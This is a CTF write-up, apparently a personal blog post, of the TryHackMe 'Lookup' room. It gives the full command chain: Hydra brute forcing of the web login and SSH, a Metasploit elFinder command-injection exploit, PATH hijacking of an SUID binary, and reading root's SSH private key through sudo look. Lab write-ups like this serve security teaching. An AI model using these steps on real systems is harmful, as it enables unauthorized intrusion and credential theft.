---
title: "Look Up - TryHackMe"
date: 2026-07-27 10:00:00 +0545

description: The room involved `web application enumeration`, `brute force attacks`, a `command injection vulnerability`, and `privilege escalation` through misconfigured binaries.

categories: [Web, Linux]
tags: [web, linux, nmap, burpsuite, hydra, metasploit, GTFOBins, sudo, pwn, look, elfinder]

image:
  path: /assets/img/posts/lookup.png
  alt: "Look Up TryHackMe"

level: Easy
platform: TryHackMe
series: "Web Exploitation"  
  
room: "Look Up"
type: "CTF Write-up"
status: Completed 
---

## Overview

This is a detailed walkthrough of how I rooted the **Lookup** room on TryHackMe and captured both user and root flags.

---

## Enumeration

I started the engagement with an `nmap` scan:

```bash
nmap -sC -sV -oN initial_scan.txt <target-ip>
```

The scan revealed two open ports:

- **22** (SSH)
- **80** (HTTP)

![Nmap scan](/assets/images/writeups/lookup/lookup_1.png)

---

## Web Application Discovery

Accessing port 80 initially led nowhere. I suspected a virtual host configuration, so I added an entry to my `/etc/hosts` file:

```
<target-ip> lookup.thm
```

After updating the hosts file, I accessed `http://lookup.thm` and was greeted with a **login page**.

![virtual host configuration](/assets/images/writeups/lookup/lookup_2.png)
---

## Username Enumeration

![Username Enumeration](/assets/images/writeups/lookup/lookup_3.png)

Upon analyzing the login functionality, I noticed:

- Wrong **username + password** → "wrong username or password"
- Correct **username**, wrong password → "wrong password"

![Username Enumeration](/assets/images/writeups/lookup/lookup_4.png)

This behavior hinted at a potential for **user enumeration**.

Using **Burp Suite Intruder** with a **Sniper attack** and the `apache-user-enum_1.0.txt` wordlist, I discovered a valid user:

- **Username:** `jose`

![Username Enumeration](/assets/images/writeups/lookup/lookup_8.png)
![Username Enumeration](/assets/images/writeups/lookup/lookup_9.png)

---

## Password Brute-Forcing

I then used **Hydra** to brute force the password for `jose`:

```bash
hydra -l jose -P /usr/share/wordlists/rockyou.txt lookup.thm http-post-form "/login:username=^USER^&password=^PASS^:F=Wrong"
```

- **Password found:** `password123`

![Password Brute-Forcing](/assets/images/writeups/lookup/lookup_10.png)

---

## File Manager Exploitation

After logging in, I was redirected to another subdomain: `files.lookup.thm`. I added it to `/etc/hosts` as well.

The site was running **elFinder**, a file manager.

![File Manager Exploitation](/assets/images/writeups/lookup/lookup_11.png)
![File Manager Exploitation](/assets/images/writeups/lookup/lookup_12.png)

### Exploitation using Metasploit

I serarched the exploit and it was available on metasploit so then i loaded the following Metasploit module:

```
exploit/unix/webapp/elfinder_php_connector_exiftran_cmd_injection
```

Configured with:

- `RHOSTS`: `files.lookup.thm`
- `LHOST`: My machine's IP

This yielded a **Meterpreter session**.
![Exploitation using Metasploit](/assets/images/writeups/lookup/lookup_13.png)
![Exploitation using Metasploit](/assets/images/writeups/lookup/lookup_14.png)
![Exploitation using Metasploit](/assets/images/writeups/lookup/lookup_14.1.png)
![Exploitation using Metasploit](/assets/images/writeups/lookup/lookup_14.2.png)

---

## Privilege Escalation - Part 1 (User)

Inside the Meterpreter session:

- Navigated to `/home` and found the user folder `think`.
- Discovered `user.txt` but could not access it.

I then searched for SUID binaries:

```bash
find / -perm /4000 2>/dev/null
```

Found:

```bash
/usr/sbin/pwm
```
![Privilege Escalation-1](/assets/images/writeups/lookup/lookup_15.png)

It was running with **root privileges**.

![Privilege Escalation-1](/assets/images/writeups/lookup/lookup_16.png)

On execution, it appeared to run `id`. I exploited this by overriding the `id` command:

```bash
echo '#!/bin/bash' > /tmp/id
echo 'echo "uid=33(think) gid=33(think) groups=(think)"' >> /tmp/id
chmod +x /tmp/id
export PATH=/tmp:$PATH
/usr/sbin/pwm
```
![Privilege Escalation-1](/assets/images/writeups/lookup/lookup_16-17_.png)

This provided me with potential passwords. I used them to brute force SSH:

```bash
hydra -l think -P pwm_passwords.txt ssh://<target-ip>
```
![Privilege Escalation-1](/assets/images/writeups/lookup/lookup_18.png)

- Successfully logged in as **think**
- Retrieved the **user flag** from `user.txt`

![Think flag](/assets/images/writeups/lookup/lookup_19.png)

---

## Privilege Escalation - Part 2 (Root)

I checked `think`’s sudo privileges:

```bash
sudo -l
```

Output showed:

```bash
(ALL : ALL) NOPASSWD: /usr/bin/look
```
![Privilege Escalation-2](/assets/images/writeups/lookup/lookup_20.png)

According to **GTFOBins**, `look` can be exploited to read arbitrary files. I retrieved the root SSH private key:

```bash
LFILE=/root/.ssh/id_rsa
sudo look '' "$LFILE"
```
![Privilege Escalation-2](/assets/images/writeups/lookup/lookup_21.png)

Saved the output and changed permissions:

```bash
chmod 600 id_rsa
ssh -i id_rsa root@<target-ip>
```

Logged in as **root** and obtained the **root flag** from `root.txt`.

![Privilege Escalation-2](/assets/images/writeups/lookup/lookup_22.png)

---

## Conclusion

The Lookup room involved a mix of:

- Web app reconnaissance
- Login enumeration
- Credential brute-forcing
- Remote code execution via a known exploit
- SUID binary path manipulation
- Sudo misconfigurations

Each step built on the last, and it was a great exercise in real-world exploitation chains.

---

🖼️ **All process screenshot**![All process screenshot](/assets/images/writeups/lookup/all_process.png)

*Thanks for reading!*
